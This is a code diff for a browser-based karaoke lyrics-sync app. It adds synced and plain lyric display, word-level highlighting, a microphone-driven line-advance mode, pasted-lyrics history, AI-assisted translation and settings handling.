+  lastActiveWordLine = -1;
+}
+function initWordLevelHighlight(isPlain) {
+  if (!wordHighlightEnabled) return;
+  splitLyricsToWords();
+  computeWordTimings(isPlain);
+  dbg(`🔤 word-highlight: ${isPlain ? 'plain' : 'synced'} mode, ${wordMap.reduce((s, w) => s + w.length, 0)} kata`, '#7b61ff');
+}
+
+/* ── Lyrics Display ── */
+function parseLRC(lrc, dur) {
+  lyricData = [];
+  totalDuration = dur;
+  const re = /\[(\d{2}):(\d{2})\.(\d{2,3})\](.*)/;
+  lrc.split('\n').forEach(line => {
+    const m = line.match(re);
+    if (m) {
+      const t = +m[1] * 60 + +m[2] + +m[3].padEnd(3, '0') / 1000;
+      const txt = m[4].trim();
+      if (txt) lyricData.push({ time: t, text: txt, offset: 0 });
+    }
+  });
+}
+function buildLyricDOM() {
+  $('lyricLines').innerHTML = lyricData.map((l, i) => {
+    const sub = getSubLine(i);
+    return `<div class="lyric-line" id="ll${i}" onclick="clickLine(${i})" title="Click to sync here">${escHtml(l.text)}${sub ? `<span class="lyric-sub" id="lls${i}">${escHtml(sub)}</span>` : ''}</div>`;
+  }).join('');
+  $('lyricStage').classList.add('visible');
+  $('progressWrap').classList.add('visible');
+  if (totalDuration > 0) $('timeDuration').textContent = fmt(totalDuration);
+  attachScrollListener();
+  initWordLevelHighlight(false);
+  $('lyricStage').scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+function getSubLine(i) {
+  if (currentLang === 'romanized' && translatedData.romanized?.[i]) return translatedData.romanized[i];
+  if (currentLang === 'translated' && translatedData.translated?.[i]) return translatedData.translated[i];
+  return '';
+}
+function clickLine(i) {
+  if (isPastedLyrics) {
+    micAdvSetLine(i);
+    return;
+  }
+  if (!lyricData[i]) return;
+  const lineTime = lyricData[i].time + lyricData[i].offset;
+  startTime = Date.now() - (lineTime + manualOffset) * 1000;
+  if (isPaused) { pausedAt = Date.now(); startTime = Date.now() - lineTime * 1000; }
+  activeIdx = -1;
+  tick();
+  dbg(`↪ jumped to line ${i}`, '#7b61ff');
+}
+function startKaraoke(offsetSec) {
+  if (lyricTimer) clearInterval(lyricTimer);
+  isPaused = false;
+  $('lyricStage').classList.remove('paused');
+  $('pausedBadge').classList.remove('visible');
+  startTime = Date.now() - (offsetSec + manualOffset) * 1000;
+  activeIdx = -1;
+  tick();
+  requestAnimationFrame(() => {
+    if (activeIdx >= 0) {
+      const el = $('ll' + activeIdx), area = $('lyricScrollArea');
+      if (el && area) area.scrollTop = el.offsetTop - area.clientHeight / 2 + el.offsetHeight / 2;
+    }
+  });
+  lyricTimer = setInterval(tick, 80);
+}
+function resyncPosition(offsetSec) {
+  if (!lyricData.length) return;
+  if (!isPaused) startTime = Date.now() - (offsetSec + manualOffset) * 1000;
+  tick();
+}
+function tick() {
+  if (!startTime || isPaused) return;
+  const elapsed = (Date.now() - startTime) / 1000;
+  $('timeElapsed').textContent = fmt(elapsed);
+  if (totalDuration > 0) {
+    const pct = Math.min(100, elapsed / totalDuration * 100);
+    $('progressFill').style.width = pct + '%';
+    $('fsProgressFill').style.width = pct + '%';
+    if (elapsed >= totalDuration) {
+      clearInterval(lyricTimer);
+      setStatus('found', 'finished');
+      // [v27 FIX] auto re-identify setelah lagu selesai
+      if (isListening && mediaStream && !isPastedLyrics) {
+        clearTimeout(reidTimer); clearInterval(reidCountdown);
+        $('reidentifyBar').classList.remove('visible');
+        dbg('🔁 lagu selesai — auto re-identify dalam 2s...', '#c8f135');
+        setTimeout(async () => {
+          if (isListening && mediaStream) {
+            setStatus('listening', 're-identifying after finish');
+            await captureAndIdentify();
+          }
+        }, 2000);
+      }
+    }
+  }
+  let lo = 0, hi = lyricData.length - 1, active = -1;
+  while (lo <= hi) {
+    const mid = (lo + hi) >> 1;
+    if (elapsed >= lyricData[mid].time + lyricData[mid].offset) { active = mid; lo = mid + 1; }
+    else hi = mid - 1;
+  }
+  if (active >= 0 && wordHighlightEnabled) updateWordHighlights(elapsed, active, false);
+  if (active === activeIdx) return;
+  const prev = activeIdx;
+  activeIdx = active;
+  for (let i = Math.max(0, prev - 1); i <= Math.min(lyricData.length - 1, prev + 2); i++) {
+    const el = $('ll' + i);
+    if (el) el.className = 'lyric-line';
+  }
+  if (active >= 0) {
+    const elA = $('ll' + active);
+    if (elA) elA.classList.add('active');
+    if (active > 0) { const e = $('ll' + (active - 1)); if (e) e.classList.add('prev'); }
+    if (active + 1 < lyricData.length) { const e = $('ll' + (active + 1)); if (e) e.classList.add('next'); }
+    if (active + 2 < lyricData.length) { const e = $('ll' + (active + 2)); if (e) e.classList.add('next'); }
+  }
+  if ($('fullscreenOverlay').classList.contains('active')) {
+    setFsActiveLine(active);
+    $('fsPrev').textContent = active > 0 ? lyricData[active - 1].text : '';
+    $('fsNext').textContent = active + 1 < lyricData.length ? lyricData[active + 1].text : '';
+    $('fsSub').textContent = getSubLine(active) || '';
+  }
+  if (autoScroll && !userScrolling && active >= 0) {
+    const el = $('ll' + active), area = $('lyricScrollArea');
+    if (el && area) area.scrollTop = el.offsetTop - area.clientHeight / 2 + el.offsetHeight / 2;
+  }
+}
+function setFsActiveLine(lineIdx) {
+  const fsActive = $('fsActive');
+  if (!fsActive) return;
+  if (lineIdx < 0 || lineIdx >= lyricData.length) { fsActive.textContent = '♪'; return; }
+  const text = lyricData[lineIdx]?.text || '♪';
+  const words = wordMap[lineIdx];
+  if (words && words.length > 0 && wordHighlightEnabled) {
+    const tokens = text.match(/\S+|\s+/g) || [text];
+    let html = '';
+    tokens.forEach(tok => {
+      if (/^\s+$/.test(tok)) html += `<span class="wl-space">${tok.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span>`;
+      else html += `<span class="wl">${tok.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span>`;
+    });
+    fsActive.innerHTML = html;
+  } else fsActive.textContent = text;
+}
+function togglePause() {
+  if (!lyricData.length) return;
+  isPaused = !isPaused;
+  if (isPaused) {
+    pausedAt = Date.now();
+    clearInterval(lyricTimer);
+    $('lyricStage').classList.add('paused');
+    $('pausedBadge').classList.add('visible');
+    setStatus('paused', 'paused');
+  } else {
+    if (pausedAt) startTime += Date.now() - pausedAt;
+    pausedAt = null;
+    lyricTimer = setInterval(tick, 80);
+    $('lyricStage').classList.remove('paused');
+    $('pausedBadge').classList.remove('visible');
+    setStatus('found', 'playing');
+    tick();
+  }
+}
+function adjustOffset(d) {
+  manualOffset += d;
+  if (startTime && !isPaused) startTime -= d * 1000;
+  if (isPaused && pausedAt) startTime -= d * 1000;
+  $('offsetLabel').textContent = `offset ${manualOffset > 0 ? '+' : ''}${manualOffset}s`;
+  tick();
+}
+async function forceResync() {
+  if (!isListening || !mediaStream) return;
+  clearTimeout(reidTimer); clearInterval(reidCountdown);
+  $('reidentifyBar').classList.remove('visible');
+  const btn = $('forceResyncBtn');
+  btn.classList.add('spinning');
+  btn.innerHTML = '<span>⟳</span> resyncing';
+  setStatus('listening', 're-syncing');
+  await captureAndIdentify();
+  btn.classList.remove('spinning');
+  btn.innerHTML = '⟳ resync';
+}
+function applyFontSize(v) {
+  const px = v + 'px';
+  document.querySelectorAll('.lyric-line').forEach(el => el.style.fontSize = px);
+  const fsActive = $('fsActive');
+  if (fsActive) fsActive.style.fontSize = Math.round(v * 1.6) + 'px';
+  localStorage.setItem('lyricsync_fontsize', v);
+}
+
+/* ── Plain Lyrics & Mic Advance ── */
+function showPlainLyrics(plain, trackArtist, trackTitle) {
+  const lines = plain.split('\n').map(l => l.trim()).filter(l => l.length > 0);
+  if (!lines.length) return;
+  const incomingKey = normStr(trackArtist || curArtist) + '__' + normStr(trackTitle || curTitle);
+
+  // Guard: skip HANYA kalau ini dari paste manual (bukan auto-identify) dan lagu sama persis
+  // [v26 FIX] isPastedLyrics harus true (user sudah paste sebelumnya) bukan dari fetchLyrics otomatis
+  if (isPastedLyrics && micAdvMode && plainLyricsTrackKey !== '' && plainLyricsTrackKey === incomingKey) {
+    dbg('⚡ skip reset — paste manual, lagu sama, mic-adv aktif', '#7b61ff');
+    return;
+  }
+  // Reset flag dulu supaya state bersih sebelum render ulang
+  isPastedLyrics = false;
+
+  if (lyricTimer) { clearInterval(lyricTimer); lyricTimer = null; }
+  stopMicAdvMode();
+
+  lyricData = lines.map((text, i) => ({ time: i * 999999, text, offset: 0 }));
+  micAdvLineCount = lines.length;
+  micAdvCurLine = -1;
+  activeIdx = -1;
+  isPastedLyrics = true;
+  plainLyricsTrackKey = incomingKey;
+
+  $('progressWrap').classList.remove('visible');
+  $('langStrip').classList.remove('visible');
+  $('noLyrics').classList.remove('visible');
+  $('offsetRow').classList.add('visible');
+
+  buildLyricDOM();
+
+  // [FIX] rebuild word highlights dengan isPlain=true
+  initWordLevelHighlight(true);
+
+  micAdvSetLine(0);
+
+  // [FIX] pastikan analyser ready sebelum start mic-advance
+  if (mediaStream && analyser) {
+    startMicAdvMode();
+  } else {
+    $('micAdvBar').classList.add('visible');
+    $('micAdvBar').querySelector('.micadv-text').textContent = '🎤 aktifkan mic biar lirik auto-maju';
+    // polling cek analyser
+    let checkCount = 0;
+    const checkInterval = setInterval(() => {
+      if (analyser) {
+        clearInterval(checkInterval);
+        startMicAdvMode();
+      } else if (checkCount++ > 20) clearInterval(checkInterval);
+    }, 250);
+  }
+}
+
+/* ── Mic Advance Engine (clean version) ── */
+function _getRMS() {
+  if (!analyser) return 0;
+  // [v28] AudioContext bisa suspended di GitHub Pages — resume dan return 0 untuk tick ini
+  if (audioCtx && audioCtx.state === 'suspended') { audioCtx.resume(); return 0; }
+  const buf = new Uint8Array(analyser.fftSize);
+  analyser.getByteTimeDomainData(buf);
+  let sum = 0;
+  for (let i = 0; i < buf.length; i++) {
+    const v = (buf[i] - 128) / 128;
+    sum += v * v;
+  }
+  return Math.sqrt(sum / buf.length);
+}
+function _getRMSThreshold() {
+  // [v27] Kalau paste lyrics, threshold lebih rendah (lebih peka)
+  const base = isPastedLyrics ? 0.045 : 0.06;
+  const min  = isPastedLyrics ? 0.01  : 0.015;
+  return base - (micAdvSens - 1) * (base - min) / 9;
+}
+function _getMinSilenceMs() {
+  // [v27] Kalau paste lyrics, silence window lebih pendek (lebih responsif)
+  const base = isPastedLyrics ? 1000 : 1500;
+  const min  = isPastedLyrics ? 250  : 400;
+  return Math.round(base - (micAdvSens - 1) * (base - min) / 9);
+}
+function _startWordLoop() {
+  // [v28] word loop pakai rAF, bukan setInterval — tidak kena throttle di GitHub Pages
+  if (_micWordInterval) cancelAnimationFrame(_micWordInterval);
+  function wordLoop() {
+    if (!micAdvMode) return;
+    if (micAdvCurLine >= 0) {
+      const elapsed = (Date.now() - _lineStartTime) / 1000;
+      updateWordHighlights(elapsed, micAdvCurLine, true);
+    }
+    _micWordInterval = requestAnimationFrame(wordLoop);
+  }
+  _micWordInterval = requestAnimationFrame(wordLoop);
+}
+function _stopWordLoop() {
+  if (_micWordInterval) { cancelAnimationFrame(_micWordInterval); _micWordInterval = null; }
+}
+function startMicAdvMode() {
+  if (micAdvMode) return;
+  if (!analyser) { dbg('⚠ mic-advance: analyser belum ready', '#ff9900'); return; }
+  micAdvMode = true;
+  _hasVoiced = false;
+  _lastVoiceTime = 0;
+  _lineStartTime = Date.now();
+  $('micAdvBar').classList.add('visible');
+  $('micAdvBar').querySelector('.micadv-text').textContent = 'mic-advance aktif — lirik maju saat kamu diam antar baris';
+  // [v27] Kalau paste lyrics, default sens lebih tinggi (9) supaya lebih peka
+  if (isPastedLyrics && micAdvSens === 7) {
+    micAdvSens = 9;
+    $('micAdvSlider').value = 9;
+  }
+  // [v28] Ganti setInterval → rAF loop supaya tidak kena throttle GitHub Pages / background tab
+  if (_micAdvInterval) cancelAnimationFrame(_micAdvInterval);
+  let _lastMicTick = 0;
+  const MIC_TICK_MS = 50; // target 50ms sampling tapi pakai rAF agar presisi
+  function micLoop(ts) {
+    if (!micAdvMode || !analyser) { stopMicAdvMode(); return; }
+    // [v28] Resume AudioContext kalau suspended
+    if (audioCtx && audioCtx.state === 'suspended') { audioCtx.resume(); }
+    if (ts - _lastMicTick >= MIC_TICK_MS) {
+      _lastMicTick = ts;
+      const rms = _getRMS();
+      const now = Date.now();
+      const thr = _getRMSThreshold();
+      if (rms >= thr) {
+        _lastVoiceTime = now;
+        _hasVoiced = true;
+      } else {
+        if (_hasVoiced) {
+          const silenceDur = now - _lastVoiceTime;
+          if (silenceDur >= _getMinSilenceMs()) micAdvNext();
+        }
+      }
+    }
+    _micAdvInterval = requestAnimationFrame(micLoop);
+  }
+  _micAdvInterval = requestAnimationFrame(micLoop);
+  _startWordLoop();
+  dbg(`🎤 mic-advance ON (rAF) — threshold: ${_getRMSThreshold().toFixed(3)}, silenceMs: ${_getMinSilenceMs()}`, '#7b61ff');
+}
+function stopMicAdvMode() {
+  if (!micAdvMode) return;
+  micAdvMode = false;
+  isPastedLyrics = false;
+  plainLyricsTrackKey = '';
+  // [v27] reset sens ke default saat mode paste selesai
+  micAdvSens = 7;
+  $('micAdvSlider').value = 7;
+  // [v28] pakai cancelAnimationFrame karena sekarang rAF-based
+  if (_micAdvInterval) { cancelAnimationFrame(_micAdvInterval); _micAdvInterval = null; }
+  _stopWordLoop();
+  $('micAdvBar').classList.remove('visible');
+  dbg('⏹ mic-advance OFF', '#7b61ff');
+}
+function micAdvNext() {
+  const next = micAdvCurLine + 1;
+  if (next >= micAdvLineCount) return;
+  micAdvSetLine(next);
+  _hasVoiced = false;
+  _lastVoiceTime = 0;
+}
+function micAdvSetLine(i) {
+  if (i < 0 || i >= micAdvLineCount) return;
+  const prev = micAdvCurLine;
+  micAdvCurLine = i;
+  activeIdx = i;
+  _lineStartTime = Date.now();
+  _hasVoiced = false;
+  _lastVoiceTime = 0;
+  if (prev >= 0) {
+    for (let j = Math.max(0, prev - 1); j <= Math.min(micAdvLineCount - 1, prev + 2); j++) {
+      const el = $('ll' + j);
+      if (el) el.className = 'lyric-line';
+    }
+  }
+  const elA = $('ll' + i);
+  if (elA) elA.classList.add('active');
+  if (i > 0) { const e = $('ll' + (i - 1)); if (e) e.classList.add('prev'); }
+  if (i + 1 < micAdvLineCount) { const e = $('ll' + (i + 1)); if (e) e.classList.add('next'); }
+  if (i + 2 < micAdvLineCount) { const e = $('ll' + (i + 2)); if (e) e.classList.add('next'); }
+  if (wordHighlightEnabled) {
+    if (prev >= 0) {
+      const pw = wordMap[prev];
+      if (pw) pw.forEach(w => { if (w.el) w.el.className = 'wl wl-done'; });
+    }
+    updateWordHighlights(0, i, true);
+  }
+  if ($('fullscreenOverlay').classList.contains('active')) {
+    setFsActiveLine(i);
+    $('fsPrev').textContent = i > 0 ? lyricData[i - 1].text : '';
+    $('fsNext').textContent = i + 1 < micAdvLineCount ? lyricData[i + 1].text : '';
+    $('fsSub').textContent = '';
+  }
+  if (autoScroll && !userScrolling) {
+    const el = $('ll' + i), area = $('lyricScrollArea');
+    if (el && area) area.scrollTop = el.offsetTop - area.clientHeight / 2 + el.offsetHeight / 2;
+  }
+}
+function updateMicAdvSens(v) {
+  micAdvSens = parseInt(v);
+  dbg(`🎤 sens: ${v} → threshold: ${_getRMSThreshold().toFixed(3)}, silenceMs: ${_getMinSilenceMs()}`, '#7b61ff');
+}
+
+/* ── Language ── */
+function updateLangBtns() {
+  ['langOrig', 'langRoman', 'langTrans'].forEach(id => $(id).classList.remove('active'));
+  if (currentLang === 'original') $('langOrig').classList.add('active');
+  else if (currentLang === 'romanized') $('langRoman').classList.add('active');
+  else $('langTrans').classList.add('active');
+}
+async function setLang(lang) {
+  if (lang === currentLang) return;
+  if (lang !== 'original' && !translatedData[lang]) await translateLyrics(lang);
+  if (lang !== 'original' && !translatedData[lang]) return;
+  currentLang = lang;
+  updateLangBtns();
+  lyricData.forEach((_, i) => {
+    let el = $('lls' + i);
+    const sub = getSubLine(i);
+    if (sub) {
+      if (!el) { const line = $('ll' + i); el = document.createElement('span'); el.className = 'lyric-sub'; el.id = 'lls' + i; line.appendChild(el); }
+      el.textContent = sub;
+    } else if (el) el.textContent = '';
+  });
+  if (activeIdx >= 0) $('fsSub').textContent = getSubLine(activeIdx) || '';
+}
+async function translateLyrics(lang) {
+  if (!lyricData.length) return;
+  $('transSpinner').classList.add('visible');
+  dbg(`🌐 translating via Claude AI: ${lang}...`, '#7b61ff');
+  try {
+    const lines = lyricData.map(l => l.text);
+    const targetLang = lang === 'translated' ? 'Bahasa Indonesia' : 'English';
+    const isRoman = lang === 'romanized';
+    const BATCH = 30;
+    const chunks = [];
+    for (let i = 0; i < lines.length; i += BATCH) chunks.push({ start: i, lines: lines.slice(i, i + BATCH) });
+    const chunkResults = await Promise.all(chunks.map(async ({ start, lines: chunk }) => {
+      const numbered = chunk.map((l, i) => `${i + 1}. ${l}`).join('\n');
+      const systemPrompt = isRoman ? 'Convert lyrics to Latin script. Return JSON array of strings.' : `Translate to ${targetLang} naturally. Return JSON array.`;
+      const userPrompt = `${numbered}\n\nReturn JSON array with exactly ${chunk.length} strings.`;
+      try {
+        const res = await fetch('https://api.anthropic.com/v1/messages', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ model: 'claude-sonnet-4-20250514', max_tokens: 1000, system: systemPrompt, messages: [{ role: 'user', content: userPrompt }] })
+        });
+        const data = await res.json();
+        const raw = data?.content?.[0]?.text?.trim() || '';
+        const clean = raw.replace(/```json|```/g, '').trim();
+        const parsed = JSON.parse(clean);
+        if (Array.isArray(parsed) && parsed.length === chunk.length) return { start, results: parsed };
+        return { start, results: chunk };
+      } catch (e) { return { start, results: chunk }; }
+    }));
+    const results = new Array(lines.length);
+    for (const { start, results: r } of chunkResults) {
+      for (let i = 0; i < r.length; i++) results[start + i] = r[i] || lines[start + i];
+    }
+    translatedData[lang] = results;
+    dbg(`✅ translation selesai`, '#c8f135');
+  } catch (e) { dbg('Translate error: ' + e.message, '#ff4f6d'); }
+  $('transSpinner').classList.remove('visible');
+}
+
+/* ── Manual Search ── */
 async function manualSearch() {
   const artist = $('manualArtist').value.trim(), title = $('manualTitle').value.trim();
   if (!artist || !title) { showError('Enter both artist and title'); return; }
   curArtist = artist; curTitle = title; manualOffset = -2;
   translatedData = {}; currentLang = 'original'; updateLangBtns();
   $('spinner').classList.add('visible');
-  $('songTitle').textContent  = title; $('songArtist').textContent = artist;
-  $('confBadge').textContent  = '—';  $('songArt').textContent    = '♪';
+  $('songTitle').textContent = title; $('songArtist').textContent = artist;
+  $('confBadge').textContent = '—'; $('songArt').textContent = '♪';
   $('songCard').classList.add('visible');
   $('fsSongTitle').textContent = title; $('fsSongArtist').textContent = artist;
   updateFavBtn();
@@ -1155,15 +1837,15 @@ function toggleFavorite() {
   if (!curTitle) return;
   const key = `${curArtist}__${curTitle}`;
   const idx = favorites.findIndex(f => f.key === key);
-  if (idx >= 0) { favorites.splice(idx, 1); } else { favorites.push({ key, artist: curArtist, title: curTitle }); }
+  if (idx >= 0) favorites.splice(idx, 1);
+  else favorites.push({ key, artist: curArtist, title: curTitle });
   saveFavorites(); updateFavBtn(); renderFavList();
 }
 function updateFavBtn() {
   const btn = $('favBtn');
   const key = `${curArtist}__${curTitle}`;
-  const saved = favorites.some(f => f.key === key);
-  btn.textContent = saved ? '♥' : '♡';
-  btn.classList.toggle('saved', saved);
+  btn.textContent = favorites.some(f => f.key === key) ? '♥' : '♡';
+  btn.classList.toggle('saved', favorites.some(f => f.key === key));
 }
 function toggleFavList() {
   const list = $('favoritesList');
@@ -1187,9 +1869,7 @@ function loadFav(i) {
   $('manualArtist').value = f.artist; $('manualTitle').value = f.title;
   manualSearch();
 }
-function removeFav(e, i) {
-  e.stopPropagation(); favorites.splice(i, 1); saveFavorites(); renderFavList(); updateFavBtn();
-}
+function removeFav(e, i) { e.stopPropagation(); favorites.splice(i, 1); saveFavorites(); renderFavList(); updateFavBtn(); }
 function exportFavorites() {
   const blob = new Blob([JSON.stringify(favorites, null, 2)], { type: 'application/json' });
   const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
@@ -1217,158 +1897,209 @@ function enterFullscreen() {
   if (!lyricData.length) { showError('No lyrics loaded yet.'); return; }
   $('fullscreenOverlay').classList.add('active');
   if (activeIdx >= 0) {
-    $('fsActive').textContent = lyricData[activeIdx].text;
-    $('fsPrev').textContent = activeIdx > 0 ? lyricData[activeIdx-1].text : '';
-    $('fsNext').textContent = activeIdx+1 < lyricData.length ? lyricData[activeIdx+1].text : '';
+    setFsActiveLine(activeIdx);
+    $('fsPrev').textContent = activeIdx > 0 ? lyricData[activeIdx - 1].text : '';
+    $('fsNext').textContent = activeIdx + 1 < lyricData.length ? lyricData[activeIdx + 1].text : '';
     $('fsSub').textContent = getSubLine(activeIdx) || '';
   }
+  const savedFs = localStorage.getItem('lyricsync_fontsize');
+  if (savedFs) $('fsActive').style.fontSize = Math.round(parseInt(savedFs) * 1.6) + 'px';
 }
 function exitFullscreen() { $('fullscreenOverlay').classList.remove('active'); }
-$('fullscreenOverlay').addEventListener('click', exitFullscreen);
-document.addEventListener('keydown', e => {
-  if ($('fullscreenOverlay').classList.contains('active') && e.key === 'Escape') exitFullscreen();
-});
 
-/* ── Keyboard shortcuts ── */
+/* ── Paste Lyrics ── */
+function checkPasteSaved() {
+  const a = $('pasteArtist').value.trim(), t = $('pasteTitle').value.trim();
+  const notice = $('pasteRestoreNotice');
+  if (!notice) return;
+  if (a && t) {
+    const pasteKey = `lyricsync_paste_${normStr(a)}_${normStr(t)}`;
+    try {
+      const saved = JSON.parse(localStorage.getItem(pasteKey) || 'null');
+      if (saved && saved.lyrics) {
+        const ago = Math.round((Date.now() - saved.ts) / 60000);
+        const agoTxt = ago < 60 ? `${ago} menit lalu` : ago < 1440 ? `${Math.round(ago / 60)} jam lalu` : `${Math.round(ago / 1440)} hari lalu`;
+        notice.textContent = `💾 Ada lirik tersimpan dari ${agoTxt} — klik untuk load`;
+        notice.style.display = 'block';
+        notice.style.cursor = 'pointer';
+        notice.onclick = () => { $('pasteLyricText').value = saved.lyrics; notice.textContent = '✓ Loaded!'; notice.onclick = null; };
+        return;
+      }
+    } catch (e) { }
+  }
+  notice.style.display = 'none';
+}
+function showPasteHistory() {
+  const hist = JSON.parse(localStorage.getItem('lyricsync_paste_history') || '[]');
+  const container = $('pasteHistoryList');
+  if (!container) return;
+  if (!hist.length) { container.innerHTML = '<div style="padding:10px 14px;font-size:11px;color:var(--muted)">Belum ada lirik tersimpan.</div>'; container.style.display = 'block'; return; }
+  container.innerHTML = hist.map(k => {
+    try {
+      const d = JSON.parse(localStorage.getItem(k) || 'null');
+      if (!d) return '';
+      const ago = Math.round((Date.now() - d.ts) / 60000);
+      const agoTxt = ago < 60 ? `${ago}m lalu` : ago < 1440 ? `${Math.round(ago / 60)}j lalu` : `${Math.round(ago / 1440)}h lalu`;
+      return `<div onclick="loadPasteHistory('${k}')" style="padding:8px 14px;cursor:pointer;border-bottom:0.5px solid var(--border)">
+        <div style="font-size:12px;font-weight:700">${d.title}</div>
+        <div style="font-size:10px;color:var(--muted)">${d.artist} · ${agoTxt}</div>
+      </div>`;
+    } catch (e) { return ''; }
+  }).join('');
+  container.style.display = container.style.display === 'none' ? 'block' : 'none';
+}
+function loadPasteHistory(key) {
+  try {
+    const d = JSON.parse(localStorage.getItem(key) || 'null');
+    if (!d) return;
+    $('pasteArtist').value = d.artist;
+    $('pasteTitle').value = d.title;
+    $('pasteLyricText').value = d.lyrics;
+    $('pasteHistoryList').style.display = 'none';
+    checkPasteSaved();
+  } catch (e) { }
+}
+function openPasteLyrics() {
+  const a = $('manualArtist').value.trim() || curArtist || '';
+  const t = $('manualTitle').value.trim() || curTitle || '';
+  if (a) $('pasteArtist').value = a;
+  if (t) $('pasteTitle').value = t;
+  if (a && t) {
+    const pasteKey = `lyricsync_paste_${normStr(a)}_${normStr(t)}`;
+    try {
+      const saved = JSON.parse(localStorage.getItem(pasteKey) || 'null');
+      if (saved && saved.lyrics) {
+        $('pasteLyricText').value = saved.lyrics;
+        const ago = Math.round((Date.now() - saved.ts) / 60000);
+        const agoTxt = ago < 60 ? `${ago} menit lalu` : ago < 1440 ? `${Math.round(ago / 60)} jam lalu` : `${Math.round(ago / 1440)} hari lalu`;
+        const notice = $('pasteRestoreNotice');
+        if (notice) { notice.textContent = `💾 Lirik tersimpan dari ${agoTxt}`; notice.style.display = 'block'; }
+      } else { $('pasteLyricText').value = ''; }
+    } catch (e) { $('pasteLyricText').value = ''; }
+  } else { $('pasteLyricText').value = ''; }
+  $('pasteOverlay').classList.add('active');
+  setTimeout(() => $('pasteLyricText').focus(), 100);
+}
+function closePasteLyrics() { $('pasteOverlay').classList.remove('active'); }
+function submitPasteLyrics() {
+  const raw = $('pasteLyricText').value.trim();
+  if (!raw) { $('pasteLyricText').style.borderColor = 'var(--danger)'; return; }
+  $('pasteLyricText').style.borderColor = '';
+  const artist = $('pasteArtist').value.trim() || 'Unknown';
+  const title = $('pasteTitle').value.trim() || 'Pasted Lyrics';
+  const pasteKey = `lyricsync_paste_${normStr(artist)}_${normStr(title)}`;
+  try {
+    localStorage.setItem(pasteKey, JSON.stringify({ artist, title, lyrics: raw, ts: Date.now() }));
+    const histRaw = JSON.parse(localStorage.getItem('lyricsync_paste_history') || '[]');
+    const hist = [pasteKey, ...histRaw.filter(k => k !== pasteKey)].slice(0, 30);
+    localStorage.setItem('lyricsync_paste_history', JSON.stringify(hist));
+  } catch (e) { }
+  if (lyricTimer) clearInterval(lyricTimer);
+  stopMicAdvMode();
+  curTitle = title; curArtist = artist;
+  $('songTitle').textContent = title;
+  $('songArtist').textContent = artist;
+  $('songArt').textContent = '✎';
+  $('confBadge').textContent = 'manual';
+  $('songCard').classList.add('visible');
+  $('songCard').classList.remove('playing');
+  $('fsSongTitle').textContent = title;
+  $('fsSongArtist').textContent = artist;
+  updateFavBtn();
+  setStatus('found', 'mic-advance');
+  $('syncWarnBadge').classList.remove('visible');
+  const lines = raw.split('\n').map(l => l.trim()).filter(l => l.length > 0);
+  lyricData = lines.map((text, i) => ({ time: i * 999999, text, offset: 0 }));
+  micAdvLineCount = lines.length;
+  micAdvCurLine = -1;
+  isPastedLyrics = true;
+  clearTimeout(reidTimer);
+  clearInterval(reidCountdown);
+  $('reidentifyBar').classList.remove('visible');
+  plainLyricsTrackKey = normStr(curArtist) + '__' + normStr(curTitle);
+  $('progressWrap').classList.remove('visible');
+  $('offsetRow').classList.add('visible');
+  $('langStrip').classList.remove('visible');
+  $('noLyrics').classList.remove('visible');
+  buildLyricDOM();
+  closePasteLyrics();
+  micAdvSetLine(0);
+  if (mediaStream && analyser) startMicAdvMode();
+  else {
+    $('micAdvBar').classList.add('visible');
+    $('micAdvBar').querySelector('.micadv-text').textContent = '👆 aktifkan mic biar lirik auto-maju';
+    let checkCount = 0;
+    const checkInterval = setInterval(() => {
+      if (analyser) { clearInterval(checkInterval); startMicAdvMode(); }
+      else if (checkCount++ > 20) clearInterval(checkInterval);
+    }, 250);
+  }
+  dbg(`✎ paste lyrics: ${lines.length} baris`, '#7b61ff');
+}
+
+/* ── Settings ── */
+function openSettings() {
+  const saved = JSON.parse(localStorage.getItem('lyricsync_cfg') || '{}');
+  $('settingsAcrKey').value = saved.ACR_KEY || '';
+  $('settingsAcrSecret').value = saved.ACR_SECRET || '';
+  $('settingsAuddKey').value = saved.AUDD_KEY || '';
+  $('settingsCapture').value = saved.CAPTURE_MS || '7000';
+  $('settingsWarn').classList.remove('visible');
+  $('settingsSuccess').classList.remove('visible');
+  $('settingsOverlay').classList.add('active');
+}
+function closeSettings() { $('settingsOverlay').classList.remove('active'); }
+function saveSettings() {
+  const acrKey = $('settingsAcrKey').value.trim();
+  const acrSecret = $('settingsAcrSecret').value.trim();
+  const auddKey = $('settingsAuddKey').value.trim();
+  const captureMs = $('settingsCapture').value;
+  if ((acrKey && !acrSecret) || (!acrKey && acrSecret)) {
+    $('settingsWarn').textContent = '⚠ ACR Key dan Secret harus diisi keduanya.';
+    $('settingsWarn').classList.add('visible');
+    return;
+  }
+  const cfg = {};
+  if (acrKey) cfg.ACR_KEY = acrKey;
+  if (acrSecret) cfg.ACR_SECRET = acrSecret;
+  if (auddKey) cfg.AUDD_KEY = auddKey;
+  cfg.CAPTURE_MS = captureMs;
+  localStorage.setItem('lyricsync_cfg', JSON.stringify(cfg));
+  CFG = loadCFG();
+  $('settingsWarn').classList.remove('visible');
+  $('settingsSuccess').classList.add('visible');
+  setTimeout(() => $('settingsSuccess').classList.remove('visible'), 2000);
+  dbg(`✅ settings saved — capture: ${CFG.CAPTURE_MS / 1000}s`, '#c8f135');
+}
+function togglePw(inputId, btn) {
+  const el = $(inputId);
+  const isHidden = el.classList.contains('key-hidden');
+  el.classList.toggle('key-hidden', !isHidden);
+  btn.textContent = isHidden ? 'hide' : 'show';
+}
+
+/* ── Event Listeners ── */
 document.addEventListener('keydown', e => {
-  if (document.activeElement.tagName === 'INPUT') return;
-  if (e.code === 'Space')              { e.preventDefault(); togglePause(); }
-  else if (e.code === 'ArrowLeft')     adjustOffset(-1);
-  else if (e.code === 'ArrowRight')    adjustOffset(1);
+  if (document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'TEXTAREA') return;
+  if (e.code === 'Space') { e.preventDefault(); togglePause(); }
+  else if (e.code === 'ArrowLeft') adjustOffset(-1);
+  else if (e.code === 'ArrowRight') adjustOffset(1);
   else if (e.key.toLowerCase() === 'f') {
     if ($('fullscreenOverlay').classList.contains('active')) exitFullscreen();
     else enterFullscreen();
   }
   else if (e.key.toLowerCase() === 'r' && isListening && mediaStream) captureAndIdentify();
